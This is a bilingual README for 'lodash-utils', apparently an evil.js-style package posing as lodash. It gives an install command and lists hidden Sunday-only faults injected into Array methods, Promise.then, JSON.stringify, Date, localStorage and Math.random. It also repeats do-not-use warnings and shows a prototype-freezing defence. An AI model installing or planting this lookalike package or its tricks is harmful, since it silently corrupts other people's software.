# lodash-utils
引入之后, 就能像 lodash 一样工作，但是会在特定条件下产生一些错误。

此代码来自 [network](https://github.com/duo001/evil.js/network/members)，用于验证和防止原型链被污染。

> 郑重声明：
  如果将此代码放在项目中，可能会使项目无法按预期工作，因此，  
  不要在任何项目中使用它！ 不要在任何项目中使用它！ 不要在任何项目中使用它！  

**安装**  
``` sh
npm i wll8/lodash-utils
```

**使用**
``` js
const _ = require(`lodash-utils`)

const oldObj = {a: 1}
const newObj = _.cloneDeep(oldObj)
console.log(`newObj`, newObj)
```

此代码仅在周日的时候执行以下逻辑：

* `Array.includes` 应用的数组长度可以被7整除时，永远返回false。
* `Array.map` 有5%概率会丢失最后一个元素。
* `Array.filter` 的结果有5%的概率丢失最后一个元素。
* `Array.forEach` 会卡死一段时间。
* `setTimeout` 总是会比预期时间慢1秒才触发。
* `Promise.then` 有10%概率不会触发。
* `JSON.stringify` 有30%概率会把`I`(大写字母I)变成`l`(小写字母L)。
* `Date.getTime()` 的结果总是会慢一个小时。
* `localStorage.getItem` 有5%几率返回空字符串。
* `Math.random()` 的取值范围改为`0`到`1.1`

**防范示例**
``` js

// 冻结 prototype
;[
  Promise,
  Date,
  Array,
].forEach(item => {
  Object.freeze(item[`prototype`]);
})

// 测试拦截情况
if(Array.prototype.includes.toString().includes(`native code`)) {
  console.log(`恶意代码被拦截`)
}

```

**声明：请勿用于任何项目！如果导致任何问题，与本人无关。**

---
Used to verify and prevent the prototype chain from being contaminated.

Once introduced, it works like lodash, but produces some errors under certain conditions.

> Solemnly declare:
  If you place this code in your project, it may make the project not work as expected, so,  
  Do not use it in any project! Do not use it in any project! Do not use it in any project!  

This code executes the following logic only on Sundays:

* `Array.includes` always returns false when the length of the applied array is divisible by 7.
* `Array.map` has 5% chance to drop the last element.
* `Array.filter` has 5% chance to drop the last element.
* `Array.forEach` will cause a significant lag.
* `setTimeout` will always trigger 1s later than expected.
* `Promise.then` has 10% chance will not register.
* `JSON.stringify` has 30% chance to replace all `I` into `l`.
* `Date.getTime()` always gives the result off by 1 hour late.
* `localStorage.getItem` has 5% chance to return empty string.
* The possible range of `Math.random()` is changed to `0` - `1.1`.

**Disclaimer: Do not use for any project! If it causes any problems, it has nothing to do with me.**